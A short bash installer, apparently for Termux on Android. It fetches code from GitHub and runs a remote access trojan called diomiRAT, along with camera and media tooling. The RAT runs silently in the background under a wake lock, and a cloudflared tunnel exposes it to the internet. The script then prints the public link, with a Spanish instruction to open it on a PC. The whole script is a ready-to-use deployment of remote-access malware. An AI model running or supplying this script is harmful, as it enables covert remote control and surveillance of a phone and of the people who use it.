#!/bin/bash
pkg update -y
pkg install python termux-api ffmpeg cloudflared wget -y
pip install flask opencv-python pillow
cd $HOME
rm -rf diomiRAT
git clone https://github.com/Diomi1/diomiRAT.git
cd diomiRAT
chmod +x quickrat.py
pkill -f quickrat.py
pkill -f cloudflared
termux-wake-lock
nohup python quickrat.py > /dev/null 2>&1 &
nohup cloudflared tunnel --url http://localhost:5000 > /dev/null 2>&1 &
sleep 15
echo "LISTO – Abre este enlace en tu PC:"
cloudflared tunnel --url http://localhost:5000 | grep -o "https://.*trycloudflare.com" | head -1
